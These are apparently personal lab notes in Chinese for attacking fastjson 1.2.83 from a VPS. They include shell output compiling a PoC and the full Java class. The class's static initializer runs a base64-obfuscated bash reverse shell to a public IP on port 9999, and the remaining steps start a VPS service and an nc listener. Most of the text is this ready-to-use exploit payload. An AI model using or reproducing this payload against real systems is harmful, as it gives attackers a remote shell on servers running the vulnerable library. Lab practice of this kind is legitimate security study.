靶场：

VPS：
1、配置java环境，jdk8
![](images/Pasted%20image%2020260922210856.png)
2、准备poc
![](images/Pasted%20image%2020260922210917.png)
3、jar-class
root@hcss-ecs-7e73:/home# cd poc/
root@hcss-ecs-7e73:/home/poc# ls
fastjson-1.2.83.jar  POC.java
root@hcss-ecs-7e73:/home/poc# javac -cp fastjson-1.2.83.jar POC.java 
root@hcss-ecs-7e73:/home/poc# ls
fastjson-1.2.83.jar  POC.class  POC.java
root@hcss-ecs-7e73:/home/poc# 

```
import com.alibaba.fastjson.annotation.JSONType;

@JSONType
public class POC {
    static {
        try {
            // 替换【你的VPS公网IP】和【监听端口】
            String cmd = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMzcuMjI5LjExOC85OTk5IDA+JjE=}|{base64,-d}|bash";
            Runtime.getRuntime().exec(new String[]{"bash","-c",cmd});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```


4、启动vps服务

5、nc进行监听端口

